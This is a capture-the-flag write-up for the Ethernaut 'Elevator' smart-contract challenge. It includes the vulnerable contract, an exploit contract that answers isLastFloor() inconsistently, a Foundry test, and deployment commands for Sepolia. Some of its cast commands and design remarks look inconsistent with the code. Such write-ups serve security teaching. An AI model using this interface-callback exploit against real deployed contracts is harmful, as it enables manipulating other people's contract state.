## 👾 11. Elevator

<br>


### tl; dr

<br>


* this challenge explores vulnerabilities in smart contract composability (usually classified into **ERC standards**, **libraries**, and **interfaces**). 

<br>

* more specifically, the lesson in this challenge is to **be careful when using interfaces** (or other contracts), as they introduce an attack surface to any re-implementable function (and `view` or `pure` modifiers cannot be treated as guarantees for function behavior).
  - **[remember that an `interface`](https://solidity-by-example.org/interface/)** cannot have any functions implemented, declare a constructor, declare state variables, and all functions must be external.

<br>

* in addition, another takeaway is to refrain from giving permissions to `msg.sender` to implement interfaces or modify the storage and state of your contract (unless explicitly required).



<br>
  
<p align="center">
<img width="300" src="https://github.com/go-outside-labs/ethernaut-foundry-detailed-solutions-sol/assets/138340846/46235a71-05d9-444c-9e0f-2cffc13d88a5">
</p>


<br>

```solidity
pragma solidity ^0.8.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```


<br>

---

### discussion

<br>

* the contract starts with an `interface` containing an `external` function that returns a `bool` if `isLastFloor()`. 
  - note that `external` allows a state change (an alternative is `view`, which doesn't allow modification of the state of the contract).


```solidity
interface Building {
  function isLastFloor(uint) external returns (bool);
}
```

<br>

* now, let's look at the `Elevator` contract, where we already see a mistake in the very definition:


```solidity
contract Elevator {...}
```

should be, instead,

```solidity
contract Elevator is Building {...} 
```


<br>


* next, we see two state variables, `bool top` to indicate if we are at the top and `uint floor` telling where to go:

```solidity
bool public top;
uint public floor;
```

<br>

* finally, there is one (`public`) function, which simulates the movement of the elevator by first initiating the `building` contract (with the data provided by `msg.sender`) and then taking `uint _floor`. this challenge's vulnerability is found in this part, due to the unchecked assumption about the caller:


```solidity
function goTo(uint _floor) public {
    Building building = Building(msg.sender);
}
```

<br>

* if the given floor number is not the last, fill both in variables `floor` and `top`:



```solidity
    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
```

<br>

* our goal is to pass the check `!building.isLastFloor(_floor)` so that we can make `top == True` by hacking the interface function `isLastFloor()`. 
  - we can achieve this by tailoring an exploit using the interface and defining `isLastFloor()` to return `false` in the first call and `true` in the second call (with the same input).

<br>

----

### solution

<br>

* an exploit could be crafted with `contract.call(abi.encodeWithSignature("goTo(uint)", 0))`. 
  - however, since we are leveraging foundry, we craft the following exploit:


```solidity
contract ElevatorExploit is Building {
    
    uint public lastFloor;

    function isLastFloor(uint thisFloor) external override returns (bool) {

        if (lastFloor != thisFloor) {
            lastFloor = thisFloor;
            return false;
        } 
        return true;
    }

    function run(Elevator level) public {
        level.goTo(1337);
    }
}
```


<br>

* which can be tested with `test/11.Elevator.t.sol`:

<br>

```solidity
contract ElevatorTest is Test {

    Elevator public level = new Elevator();
    address hacker = vm.addr(0x1337); 

    function testElevatorHack() public {

        vm.startPrank(hacker);
        ElevatorExploit exploit = new ElevatorExploit();
        exploit.run(level);
        assert(level.top());
        vm.stopPrank();
        
    }
}
```

<br>

* by running:

```shell
forge test --match-contract ElevatorTest -vvvv
```

<br>

* and submitted with `script/11/Elevator.s.sol`:

<br>


```solidity
contract Exploit is Script {

    address instance = vm.envAddress("INSTANCE_LEVEL11");  
    address hacker = vm.rememberKey(vm.envUint("PRIVATE_KEY"));   
    Elevator level = Elevator(instance);  
    ElevatorExploit public exploit;

    function run() external {
        vm.startBroadcast(hacker);
        exploit = new ElevatorExploit();
        exploit.run(level);
        vm.stopBroadcast();
    }
}
```

<br>

* by running:

<br>

```shell
> forge script ./script/11/Elevator.s.sol --broadcast -vvvv --rpc-url sepolia
```

<br>

---

### solution using `cast` and `forge`

<br>

* another way to submit our exploit is through `cast`. first, we could deploy our attack contract with:

<br>

```shell
> forge create src/11/ElevatorExploit.sol:ElevatorExploit \ 
  --constructor-args=<level address> --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

* then, we call the contract with:

<br>

```shell
> cast send <level address> "run()" --gas <extra gas> --private-key=<private-key> --rpc-url=<sepolia url> 
```

<br>

* finally, we can confirm that `top()` is `true` with:

<br>

```shell
> cast call <level address>  "top()" --rpc-url=<sepolia url> 
```

<br>

----


### pwned...


<br>

  
<p align="center">
<img width="400" src="https://github.com/go-outside-labs/ethernaut-foundry-writeups-sol/assets/138340846/ba3f82a3-00c0-43f9-a423-588d7f6e4c70">
</p>



